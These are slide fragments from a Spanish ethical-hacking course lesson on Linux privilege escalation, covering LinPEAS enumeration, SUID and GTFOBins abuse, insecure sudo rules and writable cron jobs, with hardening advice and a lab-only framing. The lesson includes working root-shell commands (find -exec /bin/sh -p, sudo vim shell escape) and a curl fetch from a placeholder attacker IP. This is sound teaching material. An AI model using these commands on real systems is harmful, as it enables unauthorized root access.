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076 — Escalada de privilegios en Linux</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="2E8B57"/>
                </a:solidFill>
              </a:rPr>
              <a:t>parte 3 hacking etico y pentesting metodologia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aprenderá a enumerar sistemáticamente un host Linux tras obtener acceso inicial de bajo privilegio, identificar vectores de escalada (SUID/SGID, sudo mal configurado, cron jobs, PATH…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y interpretar la salida de LinPEAS y LinEnum para priorizar vectores de escalada.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binarios SUID/SGID explotables usando GTFOBins como referencia.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y abusar de entradas sudo -l mal configuradas para obtener una shell root.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cron jobs con permisos débiles y explotarlos para ejecución de código como root.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el riesgo de un PATH escribible y cómo se usa para secuestrar binarios.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Proponer contramedidas de hardening concretas para cada vector estudiado.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Enumeración post-explotación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LinPEAS / LinEnum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Binarios SUID/SGID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GTFOBins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sudo -l y /etc/sudoers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Cron jobs con permisos débiles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PATH escribible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acceso inicial en Linux suele dar una shell de usuario sin privilegios —el www-data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servidor web, una cuenta de servicio—, y desde ahí el trabajo es llegar a root, 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 el impacto que de verdad se reporta. La escalada casi nunca depende de un exploit del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kernel exótico: depende de configuraciones incorrectas que se acumulan en cualquier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sistema con el tiempo. Un permiso de más, un binario SUID innecesario, una regla de sudo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mal escrita, un cron editable. La escalada es, sobre todo, un ejercicio de enumeración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paciente: encontrar la pieza mal puesta que abre el camino.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SUID (Set User ID): bit de permiso que hace que un binario se ejecute con los privilegios del propietario del archivo, no del usuario que lo invoca. Característica clave: un SUID root ejecutado sin…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Enfoque defensivo: auditar periódicamente find / -perm -4000 y comparar contra una línea base conocida permite detectar SUID añadidos por un atacante como mecanismo de persistencia.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SGID (Set Group ID): análogo al SUID pero para el grupo propietario. Característica clave: útil cuando el objetivo es pertenecer a un grupo con acceso a recursos sensibles (por ejemplo, docker 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Enfoque defensivo: revisar membresías de grupos privilegiados (docker, disk, lxd) es tan importante como revisar SUID, porque otorgan escalada equivalente sin necesidad de un binario especial.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GTFOBins: proyecto colaborativo que documenta binarios Unix legítimos (find, vim, less, awk, etc.) y cómo abusarlos para bypass de restricciones, lectura de archivos o escalada. Característica clave…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Enfoque defensivo: el equipo azul puede usar GTFOBins como checklist para retirar SUID o reglas sudo innecesarias sobre binarios que aparecen en el catálogo.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Cron job: tarea programada por cron o crontab que se ejecuta con el UID configurado, frecuentemente root para tareas de mantenimiento. Característica clave: si el script apuntado es editable por el…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Escalada de privilegios — Pasar de un usuario limitado a root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Enumeración post-explotación — Inspeccionar el sistema en busca de vectores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LinPEAS / LinEnum — Scripts que automatizan la detección de vectores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Bit SUID — El binario corre con los privilegios de su propietario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SGID — Equivalente al SUID para el grupo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GTFOBins — Catálogo de binarios legítimos abusables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Entorno de laboratorio: una VM Linux vulnerable (por ejemplo un target de VulnHub, HackTheBox o TryHackMe, o una VM propia deliberadamente mal configurada). Nunca se practica esto contra sistemas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LinPEAS: script de la suite PEASS-ng. Descarga en la VM atacante y transfiere al objetivo vía python3 -m http.server + wget/curl.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LinEnum: script Bash más ligero, útil cuando LinPEAS no puede ejecutarse (por ejemplo en sistemas muy antiguos).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pspy: permite observar procesos y cron jobs en ejecución sin privilegios de root, útil para inferir tareas programadas sin acceso a /etc/crontab.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linux-exploit-suggester: script que compara la versión de kernel/paquetes contra una base de CVEs conocidos y sugiere exploits candidatos sin ejecutarlos automáticamente.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Snapshots de VM: antes de probar cualquier kernel exploit, toma un snapshot del estado actual; estos exploits son inestables y pueden colgar o corromper el sistema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Acceso SSH o shell reversa ya establecida en el objetivo (asumimos que la clase 075 o equivalente ya cubrió el acceso inicial).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Confirma el contexto de usuario y sistema: id, whoami, uname -a, cat /etc/os-release.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Transfiere LinPEAS al objetivo: en la atacante, python3 -m http.server 8000 dentro de la carpeta con linpeas.sh; en el objetivo, curl http://IPATACANTE:8000/linpeas.sh -o /tmp/linpeas.sh.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y guarda la salida: chmod +x /tmp/linpeas.sh &amp;&amp; /tmp/linpeas.sh -a | tee /tmp/salida.txt.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la sección de binarios SUID: find / -perm -4000 -type f 2&gt;/dev/null. Compara cada resultado contra GTFOBins (&lt;https://gtfobins.github.io&gt;) buscando la técnica "SUID".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aparece, por ejemplo, find con SUID, explota con: find . -exec /bin/sh -p \; -quit.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reglas sudo: sudo -l. Si aparece una entrada como (root) NOPASSWD: /usr/bin/vim, consulta GTFOBins para la técnica "sudo" de vim y ejecuta sudo vim -c ':!/bin/sh'.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Inspecciona cron jobs: cat /etc/crontab, ls -la /etc/cron.d/, y busca scripts referenciados con permisos de escritura para tu usuario: find / -writable -type f 2&gt;/dev/null | grep -E 'cron|\.sh$'.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manualmente (sin LinPEAS) los binarios SUID de tu VM de laboratorio y clasifica cuáles son explotables según GTFOBins.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intencionalmente una entrada sudoers insegura (NOPASSWD: /usr/bin/find) y documenta el paso a paso de la escalada.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cron job de prueba que ejecute un script propiedad de tu usuario no privilegiado desde una tarea root, y explótalo.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pspy64 para observar en tiempo real un cron job que se ejecuta cada minuto sin necesidad de leer /etc/crontab.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y documenta (sin explotar en producción) un CVE de kernel exploit relevante para una versión específica de Ubuntu o Debian.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script de hardening que corrija automáticamente los tres vectores más comunes encontrados en el laboratorio.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Reto: en la VM de laboratorio asignada (con al menos tres vectores de escalada intencionalmente configurados: un SUID explotable, una regla sudo insegura y un cron job escribible), obtén una shell…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alumno entrega capturas de id mostrando uid=0(root) para cada uno de los tres métodos, junto con el comando exacto usado y una explicación de la contramedida de hardening…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linpeas.sh: Permission denied — Falta el bit de ejecución; corregir con chmod +x linpeas.sh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find: '/proc/...': No such file or directory en la salida de LinPEAS — Ruido normal por procesos efímeros; ignorar y centrarse en secciones resaltadas en rojo/amarillo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sudo: no tty present and no askpass program specified — El comando sudo requiere una TTY interactiva; usar python3 -c 'import pty; pty.spawn("/bin/bash")' primero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explotación de GTFOBins no da shell root — Verificar que el binario realmente tiene SUID root (ls -la) y no solo permisos de ejecución normales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cron job editado nunca se ejecuta — Revisar la sintaxis del crontab y confirmar que el servicio cron/crond está activo (systemctl status cron)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Kernel exploit falla o cuelga el sistema — Los exploits de kernel son inestables por diseño; probarlos solo en VMs desechables con snapshot previo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 legal practicar escalada de privilegios en mi propia laptop con una VM?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siempre que la VM y el sistema objetivo sean de tu propiedad o de una plataforma de laboratorio autorizada (HTB, TryHackMe, VulnHub). Nunca lo hagas contra infraestructura de terceros sin…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¿LinPEAS puede dañar el sistema objetivo?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 una herramienta de solo enumeración, no explota nada por sí misma, pero puede generar mucho ruido en logs y consumir CPU; en un engagement real se debe acordar su uso con el cliente.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hago si no encuentro ningún vector obvio con LinPEAS?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capabilities (getcap -r / 2&gt;/dev/null), NFS con norootsquash, contenedores Docker mal configurados, y variables de entorno heredadas de procesos root.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GTFOBins es una herramienta defensiva y no solo ofensiva?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GTFOBins — &lt;https://gtfobins.github.io&gt;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PEASS-ng (LinPEAS) — &lt;https://github.com/peass-ng/PEASS-ng&gt;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ATT&amp;CK, Privilege Escalation (TA0004) — &lt;https://attack.mitre.org/tactics/TA0004/&gt;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Georgia Weidman, Penetration Testing: A Hands-On Introduction to Hacking, No Starch Press.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OccupyTheWeb, Linux Basics for Hackers, No Starch Press.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fee22aa368bbf9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99132"/>
            <a:ext cx="8229600" cy="30998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